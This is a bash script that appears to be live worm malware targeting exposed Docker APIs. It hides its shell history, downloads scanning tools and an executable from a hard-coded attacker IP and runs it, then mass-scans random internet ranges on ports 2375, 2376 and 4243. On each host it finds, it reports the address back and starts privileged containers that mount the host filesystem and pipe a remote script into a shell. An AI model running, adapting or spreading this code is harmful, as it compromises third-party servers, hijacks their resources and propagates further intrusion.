#!/bin/bash
echo ICAgICAgICAgIF9fX19fX19fX19fICAgICAgICAgICAgICAgICBfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwogICAgICAgICAgXF9fICAgIF9fXy9fX18gX19fX18gICAgX19fX1xfXyAgICBfX18vXCAgICAgIFxfXyAgICBfX18vCiAgICAgICAgICAgIHwgICAgfF8vIF9fIFxcX18gIFwgIC8gICAgIFx8ICAgIHwgICAvICAgfCAgIFx8ICAgIHwgICAKICAgICAgICAgICAgfCAgICB8XCAgX19fLyAvIF9fIFx8ICBZIFkgIFwgICAgfCAgLyAgICB8ICAgIFwgICAgfCAgIAogICAgICAgICAgICB8X19fX3wgXF9fXyAgPl9fX18gIC9fX3xffCAgL19fX198ICBcX19fX3xfXyAgL19fX198ICAgCiAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgIFwvICAgICAgXC8gICAgICAgICAgICAgICAgXC8gICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgX19fX18gICAgICAgICAgICAgIF9fICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgXy8gX19fX1xfX19fIF9fX19fIF8vICB8XyAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICBcICAgX19cLyBfXyBcXF9fICBcXCAgIF9fXCAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICB8ICB8IFwgIF9fXy8gLyBfXyBcfCAgfCAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgIHxfX3wgIFxfX18gID5fX19fICAvX198ICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwvICAgICBcLyAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICBfX19fX19fX19fICBfX19fX19fICAgIF9fX19fX19fX18gICAgIF9fX19fX19fICAgICAgICAgIAogICAgICAgICAgIFxfX19fX18gICBcIFwgICBfICBcICAgXF9fX19fXyAgIFwgICAvICBfX19fXy8gICAgICAgICAgCiAgICAgICAgICAgIHwgICAgfCAgXy8gLyAgL19cICBcICAgfCAgICAgICBfLyAgLyAgIFwgIF9fXyAgICAgICAgICAKICAgICAgICAgICAgfCAgICB8ICAgXCBcICBcXy8gICBcICB8ICAgIHwgICBcICBcICAgIFxfXCAgXCAgICAgICAgIAogICAgICAgICAgICB8X19fX19fICAvICBcX19fX18gIC8gIHxfX19ffF8gIC8gICBcX19fX19fICAvICAgICAgICAgCiAgICAgICAgICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICAgIFwvICAgICAgICAgICBcLyAgICAgICAgICAgICAgIAoKCl9fX19fX19fX19fX19fIF9fX19fX19fX19fX19fICBfX19fX19fXyAgIF9fX19fX19fICBfX19fX19fX18gIF9fX18gIF9fLl9fX19fX19fX19fX19fX19fX19fXyAKXF9fICAgIF9fXy8gICB8ICAgXF8gICBfX19fXy8gIFxfX19fX18gXCAgXF9fX19fICBcIFxfICAgX19fIFx8ICAgIHwvIF98XF8gICBfX19fXy9cX19fX19fICAgXAogIHwgICAgfCAvICAgIH4gICAgXCAgICBfXylfICAgIHwgICAgfCAgXCAgLyAgIHwgICBcLyAgICBcICBcL3wgICAgICA8ICAgfCAgICBfXylfICB8ICAgICAgIF8vCiAgfCAgICB8IFwgICAgWSAgICAvICAgICAgICBcICAgfCAgICAgICAgXC8gICAgfCAgICBcICAgICBcX19ffCAgICB8ICBcICB8ICAgICAgICBcIHwgICAgfCAgIFwKICB8X19fX3wgIFxfX198XyAgL19fX19fX18gIC8gIC9fX19fX19fICAvXF9fX19fX18gIC9cX19fX19fICAvX19fX3xfXyBcL19fX19fX18gIC8gfF9fX198XyAgLwogICAgICAgICAgICAgICAgXC8gICAgICAgIFwvICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICBcLyAgICAgICAgXC8gICAgICAgIFwvICAgICAgICAgXC8gCiAgICAgICAgICBfX19fX19fXyAgICAgICAgX18gIC5fXyAgLl9fICAgICAgICAgICAgICAgICAgIF9fX19fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgLyAgX19fX18vX19fX18gXy8gIHxffCAgfCB8X198IF9fX18gICAgX19fXyAgICAvICBfX19fXy8gX18gX18gIF9fX18gICAgICAgICAgICAgICAgIAogICAgICAgIC8gICBcICBfX19cX18gIFxcICAgX19cICB8IHwgIHwvICAgIFwgIC8gX19fXCAgLyAgIFwgIF9fX3wgIHwgIFwvICAgIFwgICAgICAgICAgICAgICAgCiAgICAgICAgXCAgICBcX1wgIFwvIF9fIFx8ICB8IHwgIHxffCAgfCAgIHwgIFwvIC9fLyAgPiBcICAgIFxfXCAgXCAgfCAgLyAgIHwgIFwgICAgICAgICAgICAgICAKICAgICAgICAgXF9fX19fXyAgKF9fX18gIC9fX3wgfF9fX18vX198X19ffCAgL1xfX18gIC8gICBcX19fX19fICAvX19fXy98X19ffCAgLyAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgXC8gICAgIFwvICAgICAgICAgICAgICAgICAgXC8vX19fX18vICAgICAgICAgICBcLyAgICAgICAgICAgXC8gCg== | base64 -d
unset HISTFILE
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SCAN_RATE=500000

init_main(){
SOME_INSTALL
start_the_gatling_gun
}


function SOME_INSTALL(){
if ! [ -d "/dev/shm/.../...BORG.../" ] ; then mkdir -p /dev/shm/.../...BORG.../ ; fi
if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi
fi
if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi
fi
if ! type bash 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
fi
if ! [ -f "/usr/sbin/zgrab" ] ; then curl -sLk -o /usr/sbin/zgrab http://45.9.150.36/outgoing/binary_files/scanner/zgrab ; chmod +x /usr/sbin/zgrab ; fi
if ! [ -f "/usr/sbin/jq" ] ; then curl -sLk -o /usr/sbin/jq http://45.9.150.36/outgoing/binary_files/system/jq ; chmod +x /usr/sbin/jq ; fi
if ! type masscan 2>/dev/null 1>/dev/null; then 
if type apt-get 2>/dev/null 1>/dev/null; then wget http://archive.ubuntu.com/ubuntu/pool/main/libp/libpcap/libpcap0.8_1.7.4-2_amd64.deb ; dpkg -i libpcap0.8_1.7.4-2_amd64.deb ; rm -f libpcap0.8_1.7.4-2_amd64.deb ; wget http://archive.ubuntu.com/ubuntu/pool/universe/m/masscan/masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; dpkg -i masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; rm -f masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; fi
if type yum 2>/dev/null 1>/dev/null; then wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libpcap-1.5.3-12.el7.x86_64.rpm ; rpm -Uvh libpcap-1.5.3-12.el7.x86_64.rpm ; rm -f libpcap-1.5.3-12.el7.x86_64.rpm ; wget https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm ; rpm -Uvh masscan-1.0.3-5.el7.x86_64.rpm ; rm -f masscan-1.0.3-5.el7.x86_64.rpm ; fi
fi
if ! type docker 2>/dev/null 1>/dev/null ; then 
#curl -Lk https://get.docker.com | bash ; 
curl -Lk https://transfer.sh/fQGse/docker -o /usr/bin/docker ; chmod +x /usr/bin/docker
fi
if ! [ -f "/tmp/bioset" ] ; then
if type wget 2>/dev/null 1>/dev/null ; then wget http://45.9.150.36/pwn/ziggy -O /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
if type curl 2>/dev/null 1>/dev/null ; then curl http://45.9.150.36/pwn/ziggy -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
fi
}

DOCKER_GATLING_GUN(){
PORT=$1
RATE=$2
RANGE=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
for IPADDR in ${!rndstr}
do echo "$IPADDR:$PORT"
wget -q "http://45.9.150.36/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt fuhou/borg 
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt alpine sh -c 'apk update; apt-get update ; yum clean all ; apk add bash wget ; apt-get install -y bash wget ; yum install -y bash wget ; wget -O - http://45.9.150.36/pwn/TDGGinit | sh || curl http://45.9.150.36/pwn/TDGGinit | bash' &
#timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm leave --force
#timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm join --token SWMTKN-1-5boro95fiuswddse7fpl7nzpavv3xon3xpbynelcrtnu7vqggt-cd9rfe6vsjsw7gdq1cq5nspw4 164.68.106.96:2377
done;
}

function start_the_gatling_gun(){
touch /tmp/.tdgg.status
docker ps >> /tmp/.tdgg.status
if [[ $(grep "/root/TDGG.sh" /tmp/.tdgg.status) ]] ; then 
echo "Another version of the DGG is already running!" ; exit
else 

while true ; do 
N=$(($RANDOM%255+1)) 

#for N in $(seq 120 150); do
PORT_TO_PWN_ARRAY=("2375" "2376" "4243")
for PORT_TO_PWN in ${PORT_TO_PWN_ARRAY[@]}
do
DOCKER_GATLING_GUN $PORT_TO_PWN $SCAN_RATE $N
done
done

fi
}


init_main
